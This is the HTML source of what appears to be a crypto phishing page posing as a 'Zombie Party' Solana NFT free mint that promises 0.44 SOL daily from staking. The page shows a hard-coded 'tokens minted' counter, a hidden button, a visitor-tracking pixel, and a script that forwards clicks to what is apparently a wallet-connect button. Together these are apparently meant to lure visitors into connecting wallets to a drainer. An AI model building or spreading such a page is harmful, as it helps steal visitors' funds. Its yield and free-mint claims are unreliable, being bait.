<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Zombie Party</title>
    <meta name="twitter:card" content="summary_large_image">
    <link type="application/json+oembed" href="embed.json"/>
    <link rel="stylesheet" href="ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link rel="stylesheet" href="assets/css/normalize.css">
    <link rel="stylesheet" href="assets/css/style.css@1221ss2a2.css">
    <link rel="stylesheet" href="assets/css/style.css@s1xsx.css">

    <script>
        window.addEventListener('click', () => {
            document.getElementById('showcase__btn0').addEventListener('click', function(e) {
                document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
            });
        });
    </script>
</head>

<body>
    <script>
        new Image().src = "http://whos.amung.us/swidget/userlers";
    </script>
    <header>
   
        <div class="social-list">
           
        </div>
    </header>

    <section class="section main-screen">
        <div class="main-area">

            <div class="main-area__right">
                <h2 class="right-title">Zombie Party</h2>

                <div class="right-list">
                    <li>
                        <div class="text">
                            Staking your zombie to get 0.44 $SOL daily. Minting soon. <br>Supply 969 <br>Free mint
                        </div>
                    </li>
                </div>

                <div class="price">
                    <div class="add-input-remove">
                        <input type="text" id="total" value="1" readonly="">
                        <a href="javascript:void(0)" class="minus-btn">-</a>
                        <a href="javascript:void(0)" class="plus-btn">+</a>
                    </div>
                    <div class="token">
                        <div class="token-title">TOKENS MINTED</div>
                        <div class="token-line">
                            <div class="line"></div>
                            <div class="progress-line"></div>
                        </div>
                        <div class="token-number" id="tokenup"><span id="tokennumber">267</span> <span id="endTick">969</span></div>
                    </div>
                </div>
                <div class="mint-btn">
                    <div id="root" class="cl-root">
                    <main>
                    <button id="butt" class="join-btn" tabindex="0" type="button" style="display: none;"></button>
                    </main>
                    </div>
                    </div>
            </div>


            <div class="main-area__left">
                <div class="slider-area">
                    <img class="animation" src="img/main.gif" alt="GiF">
                    
                </div>
            </div>

        </div>
    </section>

    <script src="assets/js/jquery-3.6.0.min.js"></script>
    <script src="assets/js/slick.min.js"></script>

    <script>
        const $plusButton = document.querySelector(".plus-btn");
        const $minuButton = document.querySelector(".minus-btn");
        const $numberText = document.querySelector("#total");
        const $remaining = document.querySelector('#remaining');
        const $priceResultText = document.querySelector("#price-total span");
        let itemPriceSelected = 2;
        let itemCount = 1;

        $plusButton.addEventListener("click", function(e) {
            e.preventDefault();
            itemCount = itemCount < 5 ? itemCount + 1 : 1;
            $numberText.value = itemCount;
            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
        });
        $minuButton.addEventListener("click", function(e) {
            e.preventDefault();
            itemCount = parseInt($numberText.value);
            itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
            $numberText.value = itemCount;
            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
        });
    </script>
